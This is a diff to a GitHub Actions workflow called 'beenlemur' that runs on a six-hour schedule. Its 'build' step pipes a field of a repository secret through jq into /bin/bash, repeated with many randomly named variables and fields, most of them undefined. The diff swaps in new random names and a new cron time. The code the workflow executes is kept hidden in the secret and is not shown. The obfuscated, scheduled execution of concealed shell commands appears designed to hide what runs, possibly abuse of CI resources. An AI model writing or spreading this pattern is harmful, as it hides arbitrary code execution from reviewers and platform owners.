@@ -2,7 +2,7 @@ name: beenlemur
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
+    - cron: '8 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,15 +10,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: beenlemur
         env:
-          zw77853: ${{ secrets.zw77853 }}
+          u21: ${{ secrets.u21 }}
         run: |
-          echo $zw77853 | jq -r .epxpt1 | /bin/bash
-          echo $om26 | jq -r .il20 | /bin/bash
-          echo $q8 | jq -r .ruw970 | /bin/bash
-          echo $ch9010 | jq -r .o133 | /bin/bash
-          echo $dh206 | jq -r .szwp9018 | /bin/bash
-          echo $woe415 | jq -r .fdgb819 | /bin/bash
-          echo $jfp4 | jq -r .yls9 | /bin/bash
-          echo $gkv02 | jq -r .sxhb22130 | /bin/bash
-          echo $lzt41 | jq -r .tj20 | /bin/bash
+          echo $u21 | jq -r .hv3 | /bin/bash
+          echo $c621 | jq -r .waxd28 | /bin/bash
+          echo $vnyc71 | jq -r .oqrjp082 | /bin/bash
+          echo $xzhg285 | jq -r .j89348 | /bin/bash
+          echo $pndba35829 | jq -r .hivdx93684 | /bin/bash
+          echo $gmvsb319 | jq -r .etniz773 | /bin/bash
+          echo $rndw1 | jq -r .mir375 | /bin/bash
+          echo $iarki005 | jq -r .clq61 | /bin/bash
+          echo $upgu15290 | jq -r .slq076 | /bin/bash
+          echo $iq9 | jq -r .iam735 | /bin/bash
+          echo $vpkr82648 | jq -r .ya95864 | /bin/bash
+          echo $kda72168 | jq -r .occ56 | /bin/bash
+          echo $fsxbm51130 | jq -r .ibkv56505 | /bin/bash
+          echo $o13 | jq -r .wao2 | /bin/bash
+          echo $ourjp2390 | jq -r .lxa0154 | /bin/bash
 
